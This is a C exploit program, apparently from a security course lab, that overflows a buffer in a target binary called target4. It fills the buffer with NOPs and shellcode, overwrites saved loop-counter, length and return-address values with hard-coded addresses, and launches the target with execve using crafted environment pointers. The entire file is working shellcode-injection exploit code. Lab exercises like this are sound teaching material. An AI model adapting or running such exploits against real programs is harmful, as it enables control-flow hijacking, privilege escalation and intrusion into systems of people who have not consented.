#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"

#define RETURN_ADDR "\xf0\xfd\x21\x20"
#define I_ADDR "\xA4\x00\x00\x00"
#define LEN_ADDR "\xB8\x00\x00\x00"
#define NOP 0x90

int main(void)
{
    char *args[3];
    char *env[6];

	// int * ret = 0x2021fea8;
	// int * len = 0x2021fe9c;
    // int * i = 0x2021fe98;
	// int * buf = 0x2021fdf0; // new ret

	char exploit_buffer[189];
	int shellcode_size = strlen(shellcode);
	
	// Copy the buffer with shellcode first
	memset(exploit_buffer, NOP, 189);
	memcpy(exploit_buffer, shellcode, shellcode_size);

    memcpy(&exploit_buffer[168], I_ADDR, 4);
    memcpy(&exploit_buffer[172], LEN_ADDR, 4);

    memcpy(&exploit_buffer[184], RETURN_ADDR, 4);
	exploit_buffer[188] = '\0'; 

    args[0] = TARGET; 
    args[1] = exploit_buffer; 
    args[2] = NULL;

    env[0] = "\x00";   
    env[1] = "\x00";
    env[2] = &exploit_buffer[172];
    env[3] = "\x00"; 
    env[4] = "\x00";
    env[5] = &exploit_buffer[176];

    if (0 > execve(TARGET, args, env))
        fprintf(stderr, "execve failed.\n");

    return 0;
}
